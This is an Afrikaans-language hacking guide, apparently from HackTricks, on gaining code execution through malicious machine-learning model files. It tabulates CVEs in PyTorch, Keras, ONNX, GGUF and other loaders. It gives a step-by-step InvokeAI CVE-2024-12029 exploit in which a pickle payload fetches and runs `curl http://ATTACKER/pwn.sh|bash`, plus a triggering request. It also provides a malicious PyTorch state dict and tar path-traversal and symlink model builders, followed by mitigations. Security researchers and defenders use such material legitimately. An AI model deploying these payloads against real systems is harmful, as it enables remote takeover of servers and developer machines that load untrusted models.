# Modelle RCE

{{#include ../banners/hacktricks-training.md}}

## Laai modelle na RCE

Masjienleer modelle word gewoonlik in verskillende formate gedeel, soos ONNX, TensorFlow, PyTorch, ens. Hierdie modelle kan in ontwikkelaars se masjiene of produksiesisteme gelaai word om hulle te gebruik. Gewoonlik behoort die modelle nie kwaadwillige kode te bevat nie, maar daar is sommige gevalle waar die model gebruik kan word om arbitrêre kode op die stelsel uit te voer as 'n beoogde funksie of as gevolg van 'n kwesbaarheid in die model laai biblioteek.

Tydens die skryf hiervan is hier 'n paar voorbeelde van hierdie tipe kwesbaarhede:

| **Raamwerk / Gereedskap**   | **Kwesbaarheid (CVE indien beskikbaar)**                                                                                     | **RCE Vektor**                                                                                                                         | **Verwysings**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Onveilige deserialisering in* `torch.load` **(CVE-2025-32434)**                                                             | Kwaadwillige pickle in model kontrolepunt lei tot kode-uitvoering (om `weights_only` beskerming te omseil)                               | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                        | SSRF + kwaadwillige model aflaai veroorsaak kode-uitvoering; Java deserialisering RCE in bestuur API                                     | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (onveilige YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                   | Laai model vanaf YAML gebruik `yaml.unsafe_load` (kode exec) <br> Laai model met **Lambda** laag voer arbitrêre Python kode uit           | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                         | Gemaakte `.tflite` model veroorsaak heelgetal oorgang → heap korrupsie (potensiële RCE)                                               | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                          | Laai 'n model via `joblib.load` voer pickle met aanvaller se `__reduce__` payload uit                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (onveilige `np.load`) *betwis*                                                                             | `numpy.load` standaard het toegelaat dat gepekelde objekreeks – kwaadwillige `.npy/.npz` veroorsaak kode exec                             | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversaal) <br> **CVE-2024-5187** (tar traversaal)                                                 | ONNX model se eksterne gewigte pad kan die gids ontsnap (lees arbitrêre lêers) <br> Kwaadwillige ONNX model tar kan arbitrêre lêers oorskryf (wat lei tot RCE) | |
| ONNX Runtime (ontwerp risiko) | *(Geen CVE)* ONNX pasgemaakte ops / kontrole vloei                                                                          | Model met pasgemaakte operator vereis laai van aanvaller se inheemse kode; komplekse model grafieke misbruik logika om onbedoelde berekeninge uit te voer | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (pad traversaal)                                                                                         | Gebruik model-laai API met `--model-control` geaktiveer laat relatiewe pad traversaal toe om lêers te skryf (bv., oorskryf `.bashrc` vir RCE) | |
| **GGML (GGUF formaat)**     | **CVE-2024-25664 … 25668** (meervoudige heap oorgange)                                                                      | Misvormde GGUF model lêer veroorsaak heap buffer oorgange in parser, wat arbitrêre kode-uitvoering op die slagoffer stelsel moontlik maak | |
| **Keras (ou formate)**      | *(Geen nuwe CVE)* Erflike Keras H5 model                                                                                     | Kwaadwillige HDF5 (`.h5`) model met Lambda laag kode voer steeds uit op laai (Keras safe_mode dek nie ou formaat nie – “downgrade aanval”) | |
| **Ander** (generies)        | *Ontwerp fout* – Pickle serialisering                                                                                         | Baie ML gereedskap (bv., pickle-gebaseerde model formate, Python `pickle.load`) sal arbitrêre kode wat in model lêers ingebed is uitvoer tensy dit gemitigeer word | |

Boonop is daar sommige python pickle-gebaseerde modelle soos die wat deur [PyTorch](https://github.com/pytorch/pytorch/security) gebruik word wat gebruik kan word om arbitrêre kode op die stelsel uit te voer as hulle nie met `weights_only=True` gelaai word nie. So, enige pickle-gebaseerde model kan spesiaal kwesbaar wees vir hierdie tipe aanvalle, selfs al is hulle nie in die tabel hierbo gelys nie.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` is 'n gewilde oopbron webkoppelvlak vir Stable-Diffusion. Weergawes **5.3.1 – 5.4.2** stel die REST eindpunt `/api/v2/models/install` beskikbaar wat gebruikers toelaat om modelle van arbitrêre URL's af te laai en te laai.

Intern roep die eindpunt uiteindelik aan:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wanneer die geleverde lêer 'n **PyTorch checkpoint (`*.ckpt`)** is, voer `torch.load` 'n **pickle deserialisering** uit. Omdat die inhoud direk van die gebruiker-beheerde URL kom, kan 'n aanvaller 'n kwaadwillige objek met 'n pasgemaakte `__reduce__` metode binne die checkpoint inkorporeer; die metode word **tydens deserialisering** uitgevoer, wat lei tot **remote code execution (RCE)** op die InvokeAI bediener.

Die kwesbaarheid is toegeken **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitasiestap-vir-stap

1. Skep 'n kwaadwillige checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Host `payload.ckpt` op 'n HTTP-bediener wat jy beheer (bv. `http://ATTACKER/payload.ckpt`).
3. Trigger die kwesbare eindpunt (geen verifikasie benodig):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wanneer InvokeAI die lêer aflaai, roep dit `torch.load()` aan → die `os.system` gadget loop en die aanvaller verkry kode-uitvoering in die konteks van die InvokeAI proses.

Klaar-gemaakte uitbuiting: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` outomatiseer die hele vloei.

#### Voorwaardes

•  InvokeAI 5.3.1-5.4.2 (skandeervlag standaard **vals**)
•  `/api/v2/models/install` bereikbaar deur die aanvaller
•  Proses het toestemming om skulpopdragte uit te voer

#### Versagtings

* Opgradeer na **InvokeAI ≥ 5.4.3** – die patch stel `scan=True` standaard en voer malware-skandering uit voor deserialisering.
* Wanneer jy kontrolepunte programmaties laai, gebruik `torch.load(file, weights_only=True)` of die nuwe [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Handhaaf toelaat-lists / handtekeninge vir modelbronne en voer die diens met die minste voorregte uit.

> ⚠️ Onthou dat **enige** Python pickle-gebaseerde formaat (insluitend baie `.pt`, `.pkl`, `.ckpt`, `.pth` lêers) inherent onveilig is om te deserialiseer vanaf onbetroubare bronne.

---

Voorbeeld van 'n ad-hoc versagting as jy ouer InvokeAI weergawes agter 'n omgekeerde proxy moet hou:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Voorbeeld – die skep van 'n kwaadwillige PyTorch-model

- Skep die model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Laai die model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modelle na Pad Traversal

Soos kommentaar in [**hierdie blogpos**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), is die meeste modelle formate wat deur verskillende AI-raamwerke gebruik word, gebaseer op argiewe, gewoonlik `.zip`. Daarom kan dit moontlik wees om hierdie formate te misbruik om pad traversaal aanvalle uit te voer, wat dit moontlik maak om arbitrêre lêers van die stelsel waar die model gelaai word, te lees.

Byvoorbeeld, met die volgende kode kan jy 'n model skep wat 'n lêer in die `/tmp` gids sal skep wanneer dit gelaai word:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Of, met die volgende kode kan jy 'n model skep wat 'n symlink na die `/tmp` gids sal skep wanneer dit gelaai word:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## Verwysings

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialisering van Onbetroubare Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module dokumentasie](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – sekuriteits oorwegings vir torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
